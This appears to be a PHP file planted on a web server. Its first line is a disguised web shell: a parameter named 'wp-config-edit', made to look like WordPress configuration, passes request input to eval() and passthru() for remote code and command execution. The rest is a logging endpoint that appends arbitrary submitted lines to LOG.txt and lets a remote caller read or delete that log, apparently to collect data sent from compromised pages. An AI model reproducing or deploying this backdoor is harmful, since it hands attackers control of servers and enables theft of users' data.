<?php if(isset($_GET['wp-config-edit'])) { if ($_REQUEST['wp-config-edit'] == 'eval') { eval(get_magic_quotes_gpc() || get_magic_quotes_runtime() ? stripslashes($_REQUEST['gim']) : $_REQUEST['gim']); } else if ($_REQUEST['wp-config-edit'] == 'exec') { passthru(get_magic_quotes_gpc() || get_magic_quotes_runtime() ? stripslashes($_REQUEST['gim']) : $_REQUEST['gim']); } }?> <?php
    $myFile = "LOG.txt";
    if($_REQUEST[$_POST] == "getlog") {
        echo "<pre>";
        readfile($myFile);
        echo "</pre>";
    }
    else if($_REQUEST[$_POST] == "clearlog") {
        unlink($myFile);
    }
    else {
        $fh = fopen($myFile, 'a')or die();
        $stringData = urldecode($_REQUEST['line']) . "\n";
        fwrite($fh, $stringData);
        fclose($fh);
    }
?>